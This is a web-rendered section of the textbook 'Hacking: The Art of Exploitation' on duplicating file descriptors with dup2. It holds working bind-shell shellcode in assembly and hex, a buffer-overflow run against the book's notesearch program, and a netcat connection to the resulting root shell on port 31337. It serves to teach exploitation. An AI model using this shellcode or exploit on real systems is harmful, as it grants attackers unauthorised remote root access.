<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x541 Duplicating Standard File Descriptors</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part124.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part126.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark114">0x541 Duplicating Standard File Descriptors</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Standard input, standard output, and standard error are the three standard file descriptors used by programs to perform standard I/O. Sockets, too, are just file descriptors that can be read from and written to. By simply swapping the standard input, output, and error of the spawned shell with the connected socket file descriptor, the shell will write output and errors to the socket and read its input from the bytes that the socket received. There is a system call specifically for duplicating file descriptors, called <span class="s31">dup2</span>. This is system call number 63.</p><p style="text-indent: 0pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_940.png"/></span></p><p class="s31" style="padding-top: 12pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ grep dup2 /usr/include/asm-i386/unistd.h #define <u>&nbsp;</u>NR_dup2        63</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ man 2 dup2</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">DUP(2)           Linux Programmer&#39;s Manual           DUP(2)</p><p class="s31" style="padding-top: 11pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">NAME</p><p class="s31" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">dup, dup2 - duplicate a file descriptor</p><p class="s31" style="padding-top: 11pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">SYNOPSIS</p><p class="s31" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">#include &lt;unistd.h&gt;</p><p class="s31" style="padding-top: 2pt;padding-left: 49pt;text-indent: 0pt;text-align: left;">int dup(int oldfd);</p><p class="s31" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">int dup2(int oldfd, int newfd);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">DESCRIPTION</p><p class="s31" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">dup() and dup2() create a copy of the file descriptor oldfd.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-bottom: 3pt;padding-left: 49pt;text-indent: 0pt;text-align: left;">dup2() makes newfd be the copy of oldfd, closing newfd first if necessary.</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_941.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The bind_port.s shellcode left off with the connected socket file descriptor in EAX. The following instructions are added in the file bind_shell_beta.s to duplicate this socket into the standard I/O file descriptors; then, the tiny_shell instructions are called to execute a shell in the current process. The spawned shellâ€™s standard input and output file descriptors will be the TCP connection, allowing remote shell access.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">New Instructions from bind_shell1.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_942.png"/></span></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;text-align: left;">; dup2(connected socket, {all three standard I/O file descriptors}) mov ebx, eax   ; Move socket FD in ebx.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push BYTE 0x3F  ; dup2 syscall #63 pop eax</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">xor ecx, ecx   ; ecx = 0 = standard input int 0x80     ; dup(c, 0)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov BYTE al, 0x3F ; dup2 syscall #63</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ecx     ; ecx = 1 = standard output</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; dup(c, 1)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov BYTE al, 0x3F ; dup2 syscall #63</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">inc ecx      ; ecx = 2 = standard error</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; dup(c, 2)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;line-height: 107%;text-align: left;">; execve(const char *filename, char *const argv [], char *const envp[]) mov BYTE al, 11  ; execve syscall #11</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push edx     ; push some nulls for string termination. push 0x68732f2f  ; push &quot;//sh&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">push 0x6e69622f  ; push &quot;/bin&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov ebx, esp   ; Put the address of &quot;/bin//sh&quot; into ebx via esp. push ecx     ; push 32-bit null terminator to stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov edx, esp   ; This is an empty array for envp.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push ebx      ; push string addr to stack above null terminator. mov ecx, esp    ; This is the argv array with string ptr.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80    ; execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], [NULL])</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_943.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">When this shellcode is assembled and used in an exploit, it will bind to port 31337 and wait for an incoming connection. In the output below, grep is used to quickly check for null bytes. At the end, the process hangs waiting for a connection.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_944.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ nasm bind_shell_beta.s</p><p class="s31" style="padding-bottom: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ hexdump -C bind_shell_beta | grep --color=auto 00</p><table style="border-collapse:collapse;margin-left:88.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:39pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000000</p></td><td style="width:102pt"><p class="s42" style="padding-left: 5pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">6a 66 58 99 31 db 43 52</p></td><td style="width:102pt"><p class="s42" style="padding-left: 5pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">6a 01 6a 02 89 e1 cd 80</p></td><td style="width:80pt"><p class="s42" style="padding-left: 3pt;padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">|jfX.1.CRj.j.  |</p></td></tr><tr style="height:11pt"><td style="width:39pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000010</p></td><td style="width:102pt"><p class="s42" style="padding-left: 5pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">89 c6 6a 66 58 43 52 66</p></td><td style="width:102pt"><p class="s42" style="padding-left: 5pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">68 7a 69 66 53 89 e1 6a</p></td><td style="width:80pt"><p class="s42" style="padding-left: 3pt;padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">|..jfXCRfhzifS..j|</p></td></tr><tr style="height:10pt"><td style="width:39pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000020</p></td><td style="width:102pt"><p class="s42" style="padding-left: 5pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">10 51 56 89 e1 cd 80 b0</p></td><td style="width:102pt"><p class="s42" style="padding-left: 5pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">66 43 43 53 56 89 e1 cd</p></td><td style="width:80pt"><p class="s42" style="padding-left: 3pt;padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">|.QV.....fCCSV...|</p></td></tr></table><table style="border-collapse:collapse;margin-left:88.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:39pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000030</p></td><td style="width:102pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80 b0 66 43 52 52 56 89</p></td><td style="width:102pt"><p class="s42" style="padding-left: 5pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">e1 cd 80 89 c3 6a 3f 58</p></td><td style="width:80pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">|..fCRRV.  j?X|</p></td></tr><tr style="height:11pt"><td style="width:39pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000040</p></td><td style="width:102pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">31 c9 cd 80 b0 3f 41 cd</p></td><td style="width:102pt"><p class="s42" style="padding-left: 5pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">80 b0 3f 41 cd 80 b0 0b</p></td><td style="width:80pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">|1....?A...?A.  |</p></td></tr><tr style="height:11pt"><td style="width:39pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">00000050</p></td><td style="width:102pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">52 68 2f 2f 73 68 68 2f</p></td><td style="width:102pt"><p class="s42" style="padding-left: 5pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">62 69 6e 89 e3 52 89 e2</p></td><td style="width:80pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">|Rh//shh/bin..R..|</p></td></tr><tr style="height:11pt"><td style="width:39pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">00000060</p></td><td style="width:102pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">53 89 e1 cd 80</p></td><td style="width:102pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:80pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">|S.  |</p></td></tr><tr style="height:10pt"><td style="width:39pt"><p class="s42" style="padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000065</p></td><td style="width:102pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:102pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:80pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ export SHELLCODE=$(cat bind_shell_beta) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch SHELLCODE will be at 0xbffff97f</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./notesearch $(perl -e &#39;print &quot;\x7f\xf9\xff\xbf&quot;x40&#39;) [DEBUG] found a 33 byte note for user id 999</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">-------[ end of note data ]-------</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_945.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">From another terminal window, the program netstat is used to find the listening port. Then, netcat is used to connect to the root shell on that port.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_946.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ sudo netstat -lp | grep 31337</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">tcp    0   0  *:31337     *:*      LISTEN   25604/notesearch reader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">localhost [127.0.0.1] 31337 (?) open whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">root</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_947.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part124.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part126.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
